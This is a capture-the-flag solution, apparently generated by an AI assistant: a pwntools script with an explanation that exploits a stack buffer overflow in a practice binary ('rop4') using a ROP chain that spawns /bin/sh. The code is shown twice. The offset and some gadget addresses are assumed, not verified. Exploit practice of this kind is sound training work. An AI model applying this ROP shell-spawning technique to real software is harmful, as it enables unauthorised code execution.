("To solve this challenge using pwntools, we'll create an exploit that "
 'overflows the buffer in the `vulnerable_function` to overwrite the return '
 'address and control the program execution flow. Since the binary has **NX '
 "enabled**, we cannot execute code on the stack, so we'll use "
 '**Return-Oriented Programming (ROP)** to execute `execve("/bin/sh", NULL, '
 'NULL)` by invoking system calls using gadgets available in the binary.\n'
 '\n'
 "Here's the step-by-step plan:\n"
 '\n'
 '1. **Identify the buffer overflow vulnerability**: The `vulnerable_function` '
 'reads input into a fixed-size buffer without proper bounds checking, '
 'allowing us to overwrite the return address.\n'
 '2. **Determine the offset to the return address**: Find out how many bytes '
 'are needed to reach the return address on the stack.\n'
 '3. **Locate useful gadgets**: Use provided gadgets to manipulate registers '
 'and invoke the `execve` system call.\n'
 '4. **Build the ROP chain**: Create a sequence of gadget addresses and '
 'arguments to set up the registers correctly for the `execve` syscall.\n'
 '5. **Construct and send the payload**: Combine the padding and ROP chain and '
 'send it to the binary.\n'
 "6. **Interact with the shell**: If successful, we'll get a shell, and we can "
 'interact with it using pwntools.\n'
 '\n'
 'Below is the code to perform these steps.\n'
 '\n'
 '```python\n'
 'from pwn import *\n'
 '\n'
 '# Set up pwntools for the correct architecture\n'
 "context.update(arch='i386', os='linux')\n"
 '\n'
 '# Load the binary\n'
 "elf = ELF('./pwn/stack/rop-4/rop4')\n"
 'context.binary = elf\n'
 '\n'
 '# Enable verbose logging (optional)\n'
 "# context.log_level = 'debug'\n"
 '\n'
 '# Start the process (or connect remotely if needed)\n'
 'p = elf.process()\n'
 '\n'
 '# Find the offset to the return address\n'
 '# You can use cyclic patterns to find the exact offset\n'
 "# For this example, we'll assume the offset is 140 bytes\n"
 '\n'
 'offset = 140  # Adjust this value after verifying with cyclic patterns\n'
 '\n'
 '# Build the ROP chain\n'
 'rop = ROP(elf)\n'
 '\n'
 '# Addresses of gadgets (from the provided gadget list)\n'
 'pop_eax_ret = 0x080c28c6  # pop eax ; ret\n'
 'pop_ebx_ret = 0x080481ec  # pop ebx ; ret\n'
 'pop_ecx_ret = 0x080e3c2a  # pop ecx ; ret\n'
 'pop_edx_ret = 0x080551ca  # pop edx ; ret\n'
 'int_0x80 = 0x08049421     # int 0x80 ; ret (you may need to find this '
 'gadget)\n'
 '\n'
 '# Address of "/bin/sh" string in the binary\n'
 "bin_sh = next(elf.search(b'/bin/sh'))\n"
 '\n'
 '# Build the ROP chain to set up registers for syscall execve("/bin/sh", '
 'NULL, NULL)\n'
 'rop.raw(p32(pop_eax_ret))\n'
 'rop.raw(p32(0xb))          # syscall number for execve\n'
 'rop.raw(p32(pop_ebx_ret))\n'
 'rop.raw(p32(bin_sh))       # pointer to "/bin/sh"\n'
 'rop.raw(p32(pop_ecx_ret))\n'
 'rop.raw(p32(0x0))          # NULL\n'
 'rop.raw(p32(pop_edx_ret))\n'
 'rop.raw(p32(0x0))          # NULL\n'
 'rop.raw(p32(int_0x80))     # Trigger interrupt to invoke syscall\n'
 '\n'
 '# Print the ROP chain for debugging\n'
 "log.info('ROP chain:\\n{}'.format(rop.dump()))\n"
 '\n'
 '# Build the payload\n'
 'payload = b"A" * offset\n'
 'payload += rop.chain()\n'
 '\n'
 '# Send the payload\n'
 'p.sendline(payload)\n'
 '\n'
 '# Switch to interactive mode to use the shell\n'
 'p.interactive()\n'
 '```\n'
 '\n'
 '**Explanation:**\n'
 '\n'
 '- **Imports**: We import everything from `pwn` to access pwntools '
 'functions.\n'
 '- **Context Setup**: We specify the architecture and OS to ensure pwntools '
 'works correctly.\n'
 '- **Binary Loading**: We load the ELF binary and set it in the context.\n'
 '- **Process Starting**: We start the binary as a subprocess.\n'
 '- **Offset Calculation**: The offset is the number of bytes needed to '
 'overwrite the return address; adjust it as necessary.\n'
 '- **ROP Chain Construction**:\n'
 '  - We use the gadgets provided to set the necessary registers:\n'
 '    - `eax` to `0xb` (the syscall number for `execve`).\n'
 '    - `ebx` to the address of `"/bin/sh"`.\n'
 '    - `ecx` and `edx` to `0x0` (NULL).\n'
 '  - We then invoke `int 0x80` to trigger the syscall.\n'
 '- **Payload Construction**: We create the payload by padding with `A`s to '
 'reach the return address and append the ROP chain.\n'
 '- **Sending the Payload**: We send the payload to the process.\n'
 "- **Interaction**: We switch to interactive mode to use the shell we've "
 'gained.\n'
 '\n'
 '**Note**: Make sure to verify the gadget addresses and offset with the '
 "actual binary using tools like `ROPgadget`, `objdump`, or pwntools' own "
 'methods, as they might differ.\n'
 '\n'
 '---\n'
 '\n'
 '**Disclaimer**: Ensure you have permission to test and exploit the binary, '
 'and use this code responsibly within legal and ethical boundaries.')

from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386', os='linux')

# Load the binary and set it in the context
elf = ELF('./pwn/stack/rop-4/rop4')
context.binary = elf

# Enable verbose logging (optional)
# context.log_level = 'debug'

# Start the process (or connect remotely if needed)
p = elf.process()

# Find the offset to the return address
# You can use cyclic patterns to find the exact offset
# For this example, we'll assume the offset is 140 bytes
offset = 140  # Adjust this value after verifying with cyclic patterns

# Build the ROP chain
rop = ROP(elf)

# Addresses of gadgets (from the provided gadget list)
pop_eax_ret = 0x080c28c6  # pop eax ; ret
pop_ebx_ret = 0x080481ec  # pop ebx ; ret
pop_ecx_ret = 0x080e3c2a  # pop ecx ; ret
pop_edx_ret = 0x080551ca  # pop edx ; ret
int_0x80 = 0x08049421     # int 0x80 ; ret (you may need to find this gadget)

# Address of "/bin/sh" string in the binary
bin_sh = next(elf.search(b'/bin/sh'))

# Build the ROP chain to set up registers for syscall execve("/bin/sh", NULL, NULL)
rop.raw(p32(pop_eax_ret))
rop.raw(p32(0xb))          # syscall number for execve
rop.raw(p32(pop_ebx_ret))
rop.raw(p32(bin_sh))       # pointer to "/bin/sh"
rop.raw(p32(pop_ecx_ret))
rop.raw(p32(0x0))          # NULL
rop.raw(p32(pop_edx_ret))
rop.raw(p32(0x0))          # NULL
rop.raw(p32(int_0x80))     # Trigger interrupt to invoke syscall

# Print the ROP chain for debugging
log.info('ROP chain:\n{}'.format(rop.dump()))

# Build the payload
payload = b"A" * offset
payload += rop.chain()

# Send the payload
p.sendline(payload)

# Switch to interactive mode to use the shell
p.interactive()